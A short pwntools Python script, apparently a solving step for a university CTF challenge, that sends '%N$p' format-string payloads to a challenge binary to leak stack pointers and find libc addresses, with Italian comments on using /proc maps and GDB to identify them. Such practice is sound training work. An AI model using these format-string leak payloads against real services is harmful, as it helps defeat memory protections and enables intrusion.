from pwn import *

REMOTE = False

IP_ADDRESS = "cyberchallenge.disi.unitn.it"
PORT = 50230

if(REMOTE):
    conn = remote(IP_ADDRESS, PORT)
else:
    conn = process('./bin')

conn.sendlineafter(b"> ", b"%1$p")
first_address = (conn.recvline(keepends=False).decode())
intresting_part = first_address[:6]

for i in range(1,100):
    conn.sendlineafter(b"> ", f"%{i}$p".encode())
    pointer = conn.recvline(keepends=False).decode()
    if(intresting_part in pointer):
        print(f"{i} - {pointer}")
    # print(pointer)

conn.interactive()

# Avvio il programma in locale, in modo da sapere il PID del processo.
# Leak di qualche puntatore tramite %p
# Uso sudo cat /proc/<PID>/maps
# Guardo dentro al maps quali sono gli indirizzi che effettivamente interagiscono con libc
# Capisco che nel nostro caso il 1° e 3° puntatore sono utili. Esempio di puntatore: 0x7ffff7e1ab23
# Avvio GDB, fisso un breakpoint prima che il processo jumpi nuovamente
# Tramite x/64gx 0x7ffff7e1ab23 vediamo le varie chiamate successive a quell'indirizzo
# Alternativamente info symbol 0x7ffff7e1ab23. Mi dice cosa sta chiamando: _IO_2_1_stdin_ + 131

# Usiamo il 27
